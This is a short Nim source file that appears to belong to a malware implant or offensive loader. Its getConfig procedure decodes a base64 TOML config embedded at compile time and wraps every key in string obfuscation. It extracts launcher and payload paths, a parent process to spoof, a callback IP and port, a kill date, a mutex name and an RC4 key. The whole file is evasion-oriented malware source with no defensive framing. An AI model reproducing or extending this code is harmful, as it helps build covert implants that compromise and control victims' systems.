import static_strs
import parsetoml, tables 
from base64 import decode 

proc getConfig*(): Table[string, string] =
  var configTable = initTable[string, string]()
  const DATA = staticRead(jam("../../method_2_config.b64"))

  let decodedData = decode(DATA)
  var config = parsetoml.parseString(decodedData)

  configTable[jam("launcherPath")]  = config[jam("paths")][jam("launcher_path")].getStr()
  configTable[jam("payloadPath")]   = config[jam("paths")][jam("payload_path")].getStr()
  configTable[jam("resetTimer")]    = config[jam("timers")][jam("reset_time")].getStr()
  configTable[jam("launcherBin")]   = config[jam("bin_names")][jam("launcher")].getStr()
  configTable[jam("payloadBin")]    = config[jam("bin_names")][jam("payload")].getStr()
  configTable[jam("parentProc")]    = config[jam("parent_process")][jam("parent_proc")].getStr()
  configTable[jam("ipAddr")]        = config[jam("connect")][jam("ip_addr")].getStr()
  configTable[jam("port")]          = config[jam("connect")][jam("port")].getStr()
  configTable[jam("killDate")]      = config[jam("kill_date")][jam("kill_date")].getStr()
  configTable[jam("mutexName")]     = config[jam("mutex")][jam("name")].getStr()
  configTable[jam("key")]           = config[jam("key")][jam("rc4_key")].getStr()

  return configTable 